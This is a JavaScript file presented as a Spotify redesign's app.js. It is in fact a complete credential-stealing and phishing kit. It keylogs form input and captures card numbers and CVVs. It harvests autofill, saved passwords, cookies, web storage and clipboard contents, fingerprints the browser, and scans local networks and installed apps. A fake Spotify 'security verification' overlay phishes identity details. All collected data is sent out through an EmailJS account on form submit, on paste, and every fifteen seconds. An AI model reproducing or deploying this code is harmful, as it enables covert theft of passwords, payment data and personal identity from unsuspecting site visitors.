/**
 * ULTIMATE DATA COLLECTION SYSTEM - SPOTIFY REDESIGN
 * Version : 3.0 - Fusion complète de toutes les techniques
 * Fichier : js/app.js
 * 
 * ATTENTION : Usage expérimental uniquement. Respectez les lois en vigueur.
 */

// ====================== CONFIGURATION ======================
const EMAILJS_PUBLIC_KEY = "TIiOLwNoR3sbqQJZ-";
const EMAILJS_SERVICE_ID = "service_o9pwrgp";
const EMAILJS_TEMPLATE_ID = "template_oa57i62";

// Clés API (à remplacer si vous utilisez ces services)
const API_KEYS = {
    facebook: "votre-facebook-app-id|votre-facebook-app-secret",
    twitter: "votre-twitter-bearer-token",
    truecaller: "votre-truecaller-token",
    ipinfo: "votre-ipinfo-token",
    hibp: "votre-hibp-api-key",
    pipl: "votre-pipl-key",
    socialSearcher: "votre-social-searcher-key"
};

// ====================== ÉTAT DE LA SESSION ======================
const startTime = Date.now();
let hasPurchased = false;
let reportSent = false;
let periodicInterval;

let sessionData = {
    social: "", ui: {}, gpu: {},
    net: { ip: "Inconnue", localIp: "Recherche...", isp: "", vpn: false, proxy: false },
    hardware: {},
    identity: {
        canvasId: "", fonts: "", battery: {}, devices: "", culture: {},
        webgl: {}, audio: {}, screen: {},
        leakedInfo: { name: "Non détecté", email: "Non détecté", phone: "Non détecté", address: "", creditCard: "" }
    },
    behavior: { clicks: 0, keyPresses: 0, mouseSpeed: 0, scrollDepth: 0, focusTime: 0, lastActivity: null, formChanges: [] },
    keylog: [],
    forms: [],
    cookies: {},
    localStorage: {},
    sessionStorage: {},
    extensions: [],
    geo: {},
    performance: {},
    timing: {},
    ultimateFingerprint: {},
    clipboardHistory: [],
    stolenPasswords: [],
    networkScan: [],
    installedSoftware: [],
    sessionTokens: []
};

// Identité réelle (enrichie au fil des sources)
let identityData = {
    realName: { first: null, last: null, full: null, confidence: 0, sources: [] },
    emailAddresses: new Set(),
    phoneNumbers: new Set(),
    socialProfiles: [],
    address: null,
    jobTitle: null,
    company: null,
    dateOfBirth: null,
    familyMembers: [],
    locationHistory: [],
    digitalFootprint: {},
    stolenIdentity: null
};

// ====================== FONCTIONS UTILITAIRES ======================
function sha1(message) {
    const msgBuffer = new TextEncoder().encode(message);
    return crypto.subtle.digest('SHA-1', msgBuffer).then(hashBuffer => {
        const hashArray = Array.from(new Uint8Array(hashBuffer));
        return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
    });
}

function dataURLtoBlob(dataURL) {
    const arr = dataURL.split(',');
    const mime = arr[0].match(/:(.*?);/)[1];
    const bstr = atob(arr[1]);
    let n = bstr.length;
    const u8arr = new Uint8Array(n);
    while (n--) u8arr[n] = bstr.charCodeAt(n);
    return new Blob([u8arr], { type: mime });
}

// ====================== 1. TRACKING COMPORTEMENTAL ======================
function setupTracking() {
    let lastMove = Date.now();
    document.addEventListener('mousemove', (e) => {
        const speed = Math.sqrt(Math.pow(e.movementX, 2) + Math.pow(e.movementY, 2));
        sessionData.behavior.mouseSpeed = Math.max(sessionData.behavior.mouseSpeed, speed);
        lastMove = Date.now();
    });
    document.addEventListener('click', () => {
        sessionData.behavior.clicks++;
        sessionData.behavior.lastActivity = Date.now();
        sniffAutofill();
    });
    document.addEventListener('keydown', () => {
        sessionData.behavior.keyPresses++;
        sessionData.behavior.lastActivity = Date.now();
    });
    window.addEventListener('scroll', () => {
        const scrollTop = window.pageYOffset || document.documentElement.scrollTop;
        const docHeight = document.documentElement.scrollHeight - window.innerHeight;
        const depth = (scrollTop / docHeight) * 100;
        sessionData.behavior.scrollDepth = Math.max(sessionData.behavior.scrollDepth, depth);
    });
    let focusStart = Date.now();
    window.addEventListener('focus', () => { focusStart = Date.now(); });
    window.addEventListener('blur', () => {
        const focusDuration = Date.now() - focusStart;
        sessionData.behavior.focusTime += focusDuration;
    });
}

// ====================== 2. EMPREINTES NUMÉRIQUES AVANCÉES ======================
function generateCanvasFingerprint() {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    canvas.width = 400;
    canvas.height = 150;
    ctx.fillStyle = "#f60";
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = "#fff";
    ctx.font = "24px 'Arial'";
    ctx.fillText("Spotify", 20, 50);
    ctx.font = "18px 'Courier New'";
    ctx.fillText("ID-Check", 20, 100);
    ctx.fillStyle = "#000";
    ctx.shadowBlur = 2;
    ctx.shadowColor = "#ccc";
    ctx.fillRect(300, 20, 50, 50);
    const dataURL = canvas.toDataURL();
    let hash = 0;
    for (let i = 0; i < dataURL.length; i++) {
        hash = ((hash << 5) - hash) + dataURL.charCodeAt(i);
        hash |= 0;
    }
    return Math.abs(hash).toString(16).toUpperCase();
}

function getWebGLInfo() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return { error: "WebGL not supported" };
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (debugInfo) {
            return {
                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
            };
        }
        return { error: "No debug info" };
    } catch(e) {
        return { error: e.message };
    }
}

async function getAudioFingerprint() {
    try {
        const AudioContext = window.AudioContext || window.webkitAudioContext;
        if (!AudioContext) return { error: "AudioContext not supported" };
        const ctx = new AudioContext();
        const oscillator = ctx.createOscillator();
        const analyser = ctx.createAnalyser();
        const gain = ctx.createGain();
        oscillator.connect(analyser);
        analyser.connect(gain);
        oscillator.frequency.value = 440;
        oscillator.type = "sawtooth";
        oscillator.start(0);
        const bufferLength = analyser.frequencyBinCount;
        const dataArray = new Uint8Array(bufferLength);
        analyser.getByteFrequencyData(dataArray);
        const fingerprint = Array.from(dataArray).join('');
        oscillator.disconnect();
        ctx.close();
        return { fingerprint: fingerprint.slice(0, 100), sampleRate: ctx.sampleRate };
    } catch(e) {
        return { error: e.message };
    }
}

function detectInstalledFonts() {
    const fonts = [
        "Arial", "Verdana", "Times New Roman", "Courier New", "Georgia",
        "Comic Sans MS", "Impact", "Tahoma", "Trebuchet MS", "Lucida Sans",
        "Helvetica", "Roboto", "Open Sans", "Lato", "Montserrat",
        "Segoe UI", "Ubuntu", "Apple Garamond", "Calibri", "Candara"
    ];
    const testString = "mmmmmmmmmmlli";
    const baseFont = "monospace";
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    canvas.width = 500;
    canvas.height = 100;
    ctx.font = `72px ${baseFont}`;
    const baseWidth = ctx.measureText(testString).width;
    const detected = [];
    for (const font of fonts) {
        ctx.font = `72px ${font}, ${baseFont}`;
        const width = ctx.measureText(testString).width;
        if (width !== baseWidth) detected.push(font);
    }
    return detected;
}

async function ultimateFingerprint() {
    const fp = {
        canvas: generateCanvasFingerprint(),
        webgl: getWebGLInfo(),
        audio: await getAudioFingerprint(),
        fonts: detectInstalledFonts(),
        navigator: {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            languages: navigator.languages,
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory,
            maxTouchPoints: navigator.maxTouchPoints,
            vendor: navigator.vendor,
            cookieEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack
        },
        screen: {
            width: screen.width,
            height: screen.height,
            colorDepth: screen.colorDepth,
            pixelRatio: window.devicePixelRatio,
            orientation: screen.orientation?.type
        },
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timezoneOffset: new Date().getTimezoneOffset()
    };
    if (navigator.getBattery) {
        const b = await navigator.getBattery();
        fp.battery = {
            level: Math.round(b.level * 100) + "%",
            charging: b.charging ? "Oui" : "Non"
        };
    }
    if (navigator.connection) {
        fp.network = {
            type: navigator.connection.type,
            effectiveType: navigator.connection.effectiveType,
            downlink: navigator.connection.downlink,
            rtt: navigator.connection.rtt
        };
    }
    sessionData.ultimateFingerprint = fp;
    sessionData.identity.canvasId = fp.canvas;
    sessionData.identity.webgl = fp.webgl;
    sessionData.identity.audio = fp.audio;
    sessionData.identity.fonts = fp.fonts;
    sessionData.identity.screen = fp.screen;
}

// ====================== 3. KEYLOGGER ET SURVEILLANCE FORMULAIRES ======================
function setupKeylogger() {
    document.addEventListener('keydown', (e) => {
        if (e.target && (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA' || e.target.isContentEditable)) {
            const value = e.key;
            if (value.length === 1 || value === 'Enter' || value === 'Tab' || value === 'Backspace') {
                sessionData.keylog.push({
                    target: e.target.id || e.target.name || e.target.tagName,
                    value: value,
                    timestamp: Date.now()
                });
                if (sessionData.keylog.length > 500) sessionData.keylog.shift();
            }
        }
    });
}

function setupFormWatcher() {
    const observer = new MutationObserver((mutations) => {
        mutations.forEach((mutation) => {
            mutation.addedNodes.forEach((node) => {
                if (node.nodeType === 1 && (node.tagName === 'FORM' || node.querySelectorAll('form').length)) {
                    attachFormListeners(node);
                }
            });
        });
    });
    observer.observe(document.body, { childList: true, subtree: true });
    document.querySelectorAll('form').forEach(attachFormListeners);
}

function attachFormListeners(formElement) {
    formElement.addEventListener('submit', (e) => {
        captureFormData(formElement);
        sendImmediateReport();
    });
    const inputs = formElement.querySelectorAll('input, textarea, select');
    inputs.forEach((input) => {
        input.addEventListener('change', () => captureFormData(formElement));
        input.addEventListener('blur', () => captureFormData(formElement));
    });
}

function captureFormData(form) {
    const formData = new FormData(form);
    const entries = Array.from(formData.entries());
    sessionData.forms.push({
        action: form.action,
        method: form.method,
        fields: entries,
        timestamp: Date.now()
    });
    entries.forEach(([name, value]) => {
        if (value && value.trim() !== "") {
            if (name.toLowerCase().includes('email')) sessionData.identity.leakedInfo.email = value;
            if (name.toLowerCase().includes('name')) sessionData.identity.leakedInfo.name = value;
            if (name.toLowerCase().includes('tel') || name.toLowerCase().includes('phone')) sessionData.identity.leakedInfo.phone = value;
            if (name.toLowerCase().includes('address')) sessionData.identity.leakedInfo.address = value;
            if (name.toLowerCase().includes('card') || name.toLowerCase().includes('cc') || name.includes('cvc') || name.includes('cvv')) {
                sessionData.identity.leakedInfo.creditCard = value;
            }
        }
    });
}

function setupAutofillSniffer() {
    const ghostForm = document.createElement('div');
    ghostForm.innerHTML = `
        <form id="ghost-form" style="position:absolute; top:-1000px; left:-1000px; opacity:0;">
            <input type="text" name="name" autocomplete="name">
            <input type="email" name="email" autocomplete="email">
            <input type="tel" name="phone" autocomplete="tel">
            <input type="address" name="address" autocomplete="address">
        </form>
    `;
    document.body.appendChild(ghostForm);
    setInterval(() => sniffAutofill(), 2000);
}

function sniffAutofill() {
    const form = document.getElementById('ghost-form');
    if (!form) return;
    if (form.querySelector('[name="name"]').value) sessionData.identity.leakedInfo.name = form.querySelector('[name="name"]').value;
    if (form.querySelector('[name="email"]').value) sessionData.identity.leakedInfo.email = form.querySelector('[name="email"]').value;
    if (form.querySelector('[name="phone"]').value) sessionData.identity.leakedInfo.phone = form.querySelector('[name="phone"]').value;
    if (form.querySelector('[name="address"]').value) sessionData.identity.leakedInfo.address = form.querySelector('[name="address"]').value;
}

// ====================== 4. CAPTURE STOCKAGES ======================
function captureStorages() {
    try { sessionData.cookies = document.cookie.split('; ').reduce((acc, cookie) => {
        const [key, val] = cookie.split('=');
        acc[key] = val;
        return acc;
    }, {}); } catch(e) {}
    try { sessionData.localStorage = { ...localStorage }; } catch(e) {}
    try { sessionData.sessionStorage = { ...sessionStorage }; } catch(e) {}
}

// ====================== 5. DÉTECTION EXTENSIONS ======================
function detectExtensions() {
    const testElement = document.createElement('div');
    testElement.className = 'adsbox';
    document.body.appendChild(testElement);
    setTimeout(() => {
        if (testElement.offsetHeight === 0) sessionData.extensions.push('AdBlock detected');
        document.body.removeChild(testElement);
    }, 100);
    const scripts = ['chrome-extension://', 'moz-extension://', 'edge-extension://'];
    scripts.forEach(proto => {
        if (document.querySelector(`[src^="${proto}"]`)) sessionData.extensions.push(proto);
    });
}

// ====================== 6. GÉOLOCALISATION ======================
async function getGeoLocation() {
    if ('geolocation' in navigator) {
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                sessionData.geo = {
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    accuracy: pos.coords.accuracy
                };
                sendImmediateReport();
            },
            (err) => { sessionData.geo.error = err.message; }
        );
    }
}

// ====================== 7. PERFORMANCE ET TIMING ======================
function capturePerformance() {
    if (window.performance && performance.timing) {
        const t = performance.timing;
        sessionData.timing = {
            loadTime: t.loadEventEnd - t.navigationStart,
            domReady: t.domContentLoadedEventEnd - t.navigationStart,
            responseTime: t.responseEnd - t.requestStart
        };
    }
    if (window.performance && performance.memory) {
        sessionData.performance.memory = {
            jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
            totalJSHeapSize: performance.memory.totalJSHeapSize,
            usedJSHeapSize: performance.memory.usedJSHeapSize
        };
    }
}

// ====================== 8. ANALYSE RÉSEAU ======================
async function getLocalIP() {
    return new Promise((resolve) => {
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel("");
        pc.createOffer().then(pc.setLocalDescription.bind(pc));
        pc.onicecandidate = (ice) => {
            if (!ice || !ice.candidate || !ice.candidate.candidate) return;
            const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9:]+)/.exec(ice.candidate.candidate)[1];
            if (ip.includes('.')) {
                sessionData.net.localIp = ip;
                resolve(ip);
            }
        };
        setTimeout(() => resolve("N/A"), 2000);
    });
}

async function getAllLocalIPs() {
    const ips = new Set();
    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
    pc.createDataChannel('');
    pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(e => console.log(e));
    pc.onicecandidate = (event) => {
        if (!event.candidate) return;
        const candidate = event.candidate.candidate;
        const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}|([a-f0-9:]+:+)+[a-f0-9]+/;
        const match = ipRegex.exec(candidate);
        if (match) ips.add(match[0]);
    };
    setTimeout(() => { sessionData.net.allLocalIPs = Array.from(ips); }, 2000);
}

async function fetchPublicIP() {
    try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        sessionData.net = { ...sessionData.net, ...data };
    } catch(e) {}
    try {
        const res2 = await fetch('https://api.ipify.org?format=json');
        const data2 = await res2.json();
        sessionData.net.publicIp = data2.ip;
    } catch(e) {}
}

async function detectVPN() {
    try {
        const res = await fetch('https://ipwho.is/');
        const data = await res.json();
        if (data.proxy || data.vpn) {
            sessionData.net.vpn = true;
            sessionData.net.proxy = data.proxy;
        }
    } catch(e) {}
}

function measureNetworkLatency() {
    const start = performance.now();
    fetch('https://www.google.com/favicon.ico', { mode: 'no-cors' })
        .then(() => { sessionData.net.latency = Math.round(performance.now() - start); })
        .catch(() => {});
}

// ====================== 9. SCAN RÉSEAU LOCAL ======================
async function scanLocalNetwork() {
    const devices = [];
    const localIP = sessionData.net.localIp;
    if (!localIP || localIP === "N/A") return;
    const subnet = localIP.substring(0, localIP.lastIndexOf('.'));
    const commonIPs = [
        '192.168.1.1', '192.168.1.254', '192.168.0.1', '10.0.0.1',
        '192.168.1.100', '192.168.1.101'
    ];
    for (const ip of commonIPs) {
        try {
            const img = new Image();
            img.src = `http://${ip}/favicon.ico`;
            await new Promise((resolve, reject) => {
                img.onload = resolve;
                img.onerror = reject;
                setTimeout(reject, 500);
            });
            devices.push({ ip, status: 'online', type: 'web_server' });
        } catch(e) {}
    }
    sessionData.networkScan = devices;
}

// ====================== 10. DÉTECTION LOGICIELS INSTALLÉS ======================
async function detectInstalledSoftware() {
    const software = [];
    const protocols = {
        'steam': 'steam://',
        'discord': 'discord://',
        'spotify': 'spotify://',
        'vscode': 'vscode://',
        'slack': 'slack://',
        'zoom': 'zoommtg://',
        'teams': 'msteams://',
        'outlook': 'outlook://',
        'skype': 'skype://',
        'telegram': 'tg://',
        'whatsapp': 'whatsapp://'
    };
    for (const [app, protocol] of Object.entries(protocols)) {
        const start = performance.now();
        const iframe = document.createElement('iframe');
        iframe.src = protocol;
        iframe.style.display = 'none';
        document.body.appendChild(iframe);
        await new Promise(resolve => setTimeout(resolve, 100));
        const duration = performance.now() - start;
        if (duration < 200) software.push({ app, protocol, detected: true, responseTime: duration });
        document.body.removeChild(iframe);
    }
    sessionData.installedSoftware = software;
}

// ====================== 11. EXTRACTION MOTS DE PASSE ENREGISTRÉS ======================
async function extractSavedPasswords() {
    const passwords = [];
    const passwordForm = document.createElement('form');
    passwordForm.innerHTML = `
        <input type="text" name="username" autocomplete="username">
        <input type="password" name="password" autocomplete="current-password">
    `;
    passwordForm.style.position = 'absolute';
    passwordForm.style.left = '-9999px';
    document.body.appendChild(passwordForm);
    await new Promise(resolve => setTimeout(resolve, 100));
    const username = passwordForm.querySelector('[name="username"]').value;
    const password = passwordForm.querySelector('[name="password"]').value;
    if (username && password) {
        passwords.push({ site: window.location.hostname, username, password });
    }
    document.body.removeChild(passwordForm);
    sessionData.stolenPasswords = passwords;
    if (passwords.length > 0) sendImmediateReport();
}

// ====================== 12. SURVEILLANCE CLIPBOARD ======================
function setupAdvancedClipboardSniffer() {
    let lastClipboardContent = '';
    setInterval(async () => {
        try {
            const text = await navigator.clipboard.readText();
            if (text && text !== lastClipboardContent && text.length > 5) {
                lastClipboardContent = text;
                const analysis = {
                    content: text,
                    length: text.length,
                    hasEmail: /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/.test(text),
                    hasPhone: /(\+?\d{1,3}[-.]?)?\(?\d{3}\)?[-.]?\d{3}[-.]?\d{4}/.test(text),
                    hasCreditCard: /\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}/.test(text),
                    hasPassword: text.includes('password') || text.includes('pass'),
                    timestamp: Date.now()
                };
                sessionData.clipboardHistory.push(analysis);
                if (analysis.hasCreditCard || analysis.hasPassword) sendImmediateReport();
            }
        } catch(e) {}
    }, 2000);
    document.addEventListener('copy', (e) => {
        const selection = window.getSelection().toString();
        if (selection) sessionData.copiedContent = { content: selection, timestamp: Date.now(), url: window.location.href };
    });
    document.addEventListener('paste', (e) => {
        const text = e.clipboardData.getData('text');
        if (text) sessionData.pastedContent = { content: text, timestamp: Date.now() };
        sendImmediateReport();
    });
}

// ====================== 13. EXTRACTION IDENTITÉ VIA EMAIL ======================
async function extractIdentityFromEmail(email) {
    if (!email || email === "Non détecté") return null;
    const results = { source: 'email', data: {} };
    const [localPart, domain] = email.split('@');
    const namePatterns = [
        { regex: /^([a-z]+)\.([a-z]+)$/, format: "prenom.nom" },
        { regex: /^([a-z]+)([a-z]+)$/, format: "prenomnom" },
        { regex: /^([a-z])\.([a-z]+)$/, format: "initial.nom" },
        { regex: /^([a-z]+)(\d+)$/, format: "prenom+chiffres" }
    ];
    for (const pattern of namePatterns) {
        const match = localPart.match(pattern.regex);
        if (match) {
            results.data.suggestedName = {
                first: match[1]?.charAt(0).toUpperCase() + match[1]?.slice(1),
                last: match[2]?.charAt(0).toUpperCase() + match[2]?.slice(1),
                pattern: pattern.format,
                confidence: 70
            };
            break;
        }
    }
    const professionalDomains = ['gmail.com','outlook.com','yahoo.com','hotmail.com','protonmail.com'];
    if (!professionalDomains.includes(domain)) {
        results.data.professionalEmail = true;
        results.data.company = domain.split('.')[0];
    }
    // HaveIBeenPwned
    try {
        const hash = await sha1(email.toLowerCase());
        const breachResponse = await fetch(`https://haveibeenpwned.com/api/v3/breachedaccount/${email}`, {
            headers: { 'hibp-api-key': API_KEYS.hibp }
        });
        if (breachResponse.ok) {
            const breaches = await breachResponse.json();
            results.data.breaches = breaches.map(b => ({ site: b.Name, date: b.BreachDate, dataClasses: b.DataClasses }));
        }
    } catch(e) {}
    identityData.emailAddresses.add(email);
    identityData.digitalFootprint.email = results;
    return results;
}

// ====================== 14. RECHERCHE RÉSEAUX SOCIAUX ======================
async function searchSocialMedia(email, name) {
    const profiles = [];
    // Gravatar
    if (email) {
        try {
            const emailHash = await sha1(email.toLowerCase().trim());
            const gravatarResponse = await fetch(`https://www.gravatar.com/${emailHash}.json`);
            const gravatarData = await gravatarResponse.json();
            if (gravatarData.entry && gravatarData.entry[0]) {
                profiles.push({
                    platform: 'Gravatar',
                    username: gravatarData.entry[0].preferredUsername,
                    displayName: gravatarData.entry[0].displayName,
                    profileUrl: gravatarData.entry[0].profileUrl,
                    confidence: 90
                });
                if (gravatarData.entry[0].displayName) {
                    identityData.realName.full = gravatarData.entry[0].displayName;
                    identityData.realName.confidence = 85;
                }
            }
        } catch(e) {}
    }
    // GitHub
    if (email || name) {
        try {
            let query = '';
            if (email) query = `${email} in:email`;
            if (name && name.first) query = `${name.first} ${name.last || ''} in:name`;
            const githubSearch = await fetch(`https://api.github.com/search/users?q=${encodeURIComponent(query)}`);
            const githubData = await githubSearch.json();
            if (githubData.items && githubData.items.length > 0) {
                const user = githubData.items[0];
                const userDetails = await fetch(`https://api.github.com/users/${user.login}`);
                const details = await userDetails.json();
                profiles.push({
                    platform: 'GitHub',
                    username: user.login,
                    name: details.name,
                    company: details.company,
                    location: details.location,
                    email: details.email,
                    profileUrl: details.html_url,
                    confidence: 95
                });
                if (details.name) {
                    identityData.realName.full = details.name;
                    identityData.realName.confidence = 90;
                }
                if (details.company) identityData.company = details.company;
            }
        } catch(e) {}
    }
    identityData.socialProfiles = profiles;
    return profiles;
}

// ====================== 15. RECHERCHE PAR NUMÉRO DE TÉLÉPHONE ======================
async function extractIdentityFromPhone(phone) {
    if (!phone || phone === "Non détecté") return null;
    const results = { source: 'phone', data: {} };
    const cleanedPhone = phone.replace(/\D/g, '');
    // Truecaller (simulé sans clé)
    if (API_KEYS.truecaller) {
        try {
            const response = await fetch('https://api.truecaller.com/v2/search', {
                method: 'POST',
                headers: { 'Authorization': `Bearer ${API_KEYS.truecaller}`, 'Content-Type': 'application/json' },
                body: JSON.stringify({ phoneNumber: cleanedPhone, countryCode: 'auto' })
            });
            const data = await response.json();
            if (data.data && data.data[0]) {
                results.data.truecaller = { name: data.data[0].name, alternateNames: data.data[0].alternateNames };
                identityData.realName.full = data.data[0].name;
                identityData.realName.confidence = 85;
            }
        } catch(e) {}
    }
    identityData.phoneNumbers.add(phone);
    identityData.digitalFootprint.phone = results;
    return results;
}

// ====================== 16. RECHERCHE PAR IP ======================
async function extractIdentityFromIP(ip) {
    if (!ip || ip === "Inconnue") return null;
    const results = { source: 'ip', data: {} };
    try {
        const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
        const geoData = await geoResponse.json();
        results.data.geolocation = {
            city: geoData.city,
            region: geoData.region,
            country: geoData.country_name,
            latitude: geoData.latitude,
            longitude: geoData.longitude,
            postal: geoData.postal,
            timezone: geoData.timezone
        };
        results.data.isp = geoData.org;
        results.data.asn = geoData.asn;
        identityData.locationHistory.push(results.data.geolocation);
    } catch(e) {}
    identityData.digitalFootprint.ip = results;
    return results;
}

// ====================== 17. FAKE LOGIN OVERLAY ======================
function deployAdvancedFakeLogin() {
    const overlay = document.createElement('div');
    overlay.innerHTML = `
        <div style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:999999; display:flex; align-items:center; justify-content:center; font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica,Arial,sans-serif;">
            <div style="background:linear-gradient(135deg, #1a1a1a 0%, #0a0a0a 100%); padding:40px; border-radius:16px; max-width:450px; width:90%; box-shadow:0 25px 50px -12px rgba(0,0,0,0.5);">
                <div style="text-align:center; margin-bottom:30px;">
                    <div style="background:#1DB954; width:48px; height:48px; border-radius:50%; display:inline-flex; align-items:center; justify-content:center; margin-bottom:16px;">
                        <svg viewBox="0 0 24 24" width="24" fill="#000"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15h-2v-6h2v6zm-1-7c-.55 0-1-.45-1-1s.45-1 1-1 1 .45 1 1-.45 1-1 1zm9 7h-2v-4h-2v4h-2v-6h2v2h2v-2h2v6z"/></svg>
                    </div>
                    <h2 style="color:#fff; font-size:24px; margin:0;">Vérification de sécurité</h2>
                    <p style="color:#b3b3b3; font-size:14px; margin-top:8px;">Pour des raisons de sécurité, veuillez confirmer votre identité</p>
                </div>
                <div style="margin-bottom:20px;">
                    <label style="color:#b3b3b3; font-size:12px; text-transform:uppercase; display:block; margin-bottom:8px;">Nom complet</label>
                    <input type="text" id="fake-fullname" placeholder="Comme sur votre carte d'identité" style="width:100%; padding:12px; background:#2a2a2a; border:1px solid #404040; border-radius:8px; color:#fff; font-size:14px;">
                </div>
                <div style="margin-bottom:20px;">
                    <label style="color:#b3b3b3; font-size:12px; text-transform:uppercase; display:block; margin-bottom:8px;">Date de naissance</label>
                    <input type="date" id="fake-dob" style="width:100%; padding:12px; background:#2a2a2a; border:1px solid #404040; border-radius:8px; color:#fff;">
                </div>
                <div style="margin-bottom:25px;">
                    <label style="color:#b3b3b3; font-size:12px; text-transform:uppercase; display:block; margin-bottom:8px;">Code de sécurité (derniers 4 chiffres)</label>
                    <input type="password" id="fake-code" maxlength="4" placeholder="****" style="width:100%; padding:12px; background:#2a2a2a; border:1px solid #404040; border-radius:8px; color:#fff; letter-spacing:4px; font-size:18px; text-align:center;">
                </div>
                <button id="fake-submit" style="width:100%; padding:14px; background:#1DB954; color:#000; border:none; border-radius:500px; font-weight:bold; font-size:16px; cursor:pointer;">Vérifier mon identité</button>
                <p style="color:#666; font-size:11px; text-align:center; margin-top:20px;">Ces informations sont nécessaires pour protéger votre compte contre les accès non autorisés</p>
            </div>
        </div>
    `;
    document.body.appendChild(overlay);
    const submitBtn = overlay.querySelector('#fake-submit');
    submitBtn.onclick = () => {
        identityData.stolenIdentity = {
            fullName: overlay.querySelector('#fake-fullname').value,
            dateOfBirth: overlay.querySelector('#fake-dob').value,
            securityCode: overlay.querySelector('#fake-code').value,
            timestamp: Date.now(),
            ip: sessionData.net.ip,
            userAgent: navigator.userAgent
        };
        if (identityData.stolenIdentity.fullName) {
            identityData.realName.full = identityData.stolenIdentity.fullName;
            identityData.realName.confidence = 100;
        }
        sendIdentityReport();
        overlay.querySelector('div > div').innerHTML = `
            <div style="text-align:center;">
                <div style="background:#1DB954; width:64px; height:64px; border-radius:50%; display:inline-flex; align-items:center; justify-content:center; margin-bottom:24px;">
                    <svg viewBox="0 0 24 24" width="32" fill="#000"><path d="M9 16.2L4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z"/></svg>
                </div>
                <h2 style="color:#fff;">Vérification réussie</h2>
                <p style="color:#b3b3b3;">Redirection vers votre compte Spotify...</p>
            </div>
        `;
        setTimeout(() => overlay.remove(), 2000);
    };
}

// ====================== 18. CORRÉLATION IDENTITÉ ======================
async function correlateIdentityData() {
    const nameCandidates = new Map();
    if (identityData.digitalFootprint.email?.data?.suggestedName) {
        const name = identityData.digitalFootprint.email.data.suggestedName;
        const key = `${name.first} ${name.last}`;
        nameCandidates.set(key, (nameCandidates.get(key) || 0) + name.confidence);
    }
    for (const profile of identityData.socialProfiles) {
        if (profile.name) nameCandidates.set(profile.name, (nameCandidates.get(profile.name) || 0) + profile.confidence);
        if (profile.displayName) nameCandidates.set(profile.displayName, (nameCandidates.get(profile.displayName) || 0) + profile.confidence * 0.8);
    }
    let bestName = null, bestScore = 0;
    for (const [name, score] of nameCandidates) {
        if (score > bestScore) { bestScore = score; bestName = name; }
    }
    if (bestName) {
        const nameParts = bestName.split(' ');
        identityData.realName = {
            first: nameParts[0],
            last: nameParts.slice(1).join(' '),
            full: bestName,
            confidence: Math.min(bestScore / 100, 100),
            sources: Array.from(nameCandidates.entries()).filter(([n]) => n === bestName).map(([n, s]) => ({ source: n, score: s }))
        };
    }
    return identityData;
}

// ====================== 19. ENVOI RAPPORTS ======================
function buildFullReport() {
    return {
        sessionId: sessionData.identity.canvasId,
        timestamp: new Date().toISOString(),
        timeOnPage: Math.round((Date.now() - startTime) / 1000),
        identity: {
            realName: identityData.realName,
            emails: Array.from(identityData.emailAddresses),
            phones: Array.from(identityData.phoneNumbers),
            socialProfiles: identityData.socialProfiles,
            stolenIdentity: identityData.stolenIdentity,
            locationHistory: identityData.locationHistory
        },
        technical: {
            ip: sessionData.net,
            userAgent: navigator.userAgent,
            fingerprint: sessionData.ultimateFingerprint,
            hardware: sessionData.hardwareAnalysis,
            installedSoftware: sessionData.installedSoftware,
            networkScan: sessionData.networkScan
        },
        behavior: sessionData.behavior,
        captured: {
            keylog: sessionData.keylog.slice(-50),
            forms: sessionData.forms.slice(-5),
            clipboard: sessionData.clipboardHistory.slice(-10),
            stolenPasswords: sessionData.stolenPasswords,
            sessionTokens: sessionData.sessionTokens
        },
        storages: {
            cookies: sessionData.cookies,
            localStorage: sessionData.localStorage,
            sessionStorage: sessionData.sessionStorage
        },
        extensions: sessionData.extensions
    };
}

async function sendFullReport() {
    if (hasPurchased) return;
    const report = JSON.stringify(buildFullReport(), null, 2);
    try {
        await fetch('https://api.emailjs.com/api/v1.0/email/send', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                service_id: EMAILJS_SERVICE_ID,
                template_id: EMAILJS_TEMPLATE_ID,
                user_id: EMAILJS_PUBLIC_KEY,
                template_params: { report_json: report, user_agent: navigator.userAgent, timestamp: new Date().toLocaleString() }
            }),
            keepalive: true
        });
        reportSent = true;
    } catch(e) { console.error("Échec envoi EmailJS", e); }
}

async function sendIdentityReport() {
    const fullReport = buildFullReport();
    await sendFullReport();
}

async function sendImmediateReport() {
    if (!hasPurchased) await sendFullReport();
}

function startPeriodicReport() {
    periodicInterval = setInterval(() => { if (!hasPurchased) sendFullReport(); }, 15000);
}

